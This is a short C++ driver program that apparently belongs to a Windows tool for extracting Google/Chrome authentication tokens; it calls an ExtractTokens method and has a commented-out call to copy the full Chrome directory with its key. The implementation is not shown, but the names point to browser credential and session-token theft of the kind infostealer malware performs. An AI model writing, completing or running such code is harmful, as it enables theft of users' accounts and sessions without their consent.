#include "WindowsGoogleDbExtractor.h"

int main()
{
    google::WindowsGoogleDbExtractor winExtractor;
    std::map<std::string, std::vector<unsigned char>> tokens;
    winExtractor.ExtractTokens(tokens);
//    winExtractor.CopyGoogleChromeFullDirWithKey();
    return 0;
}

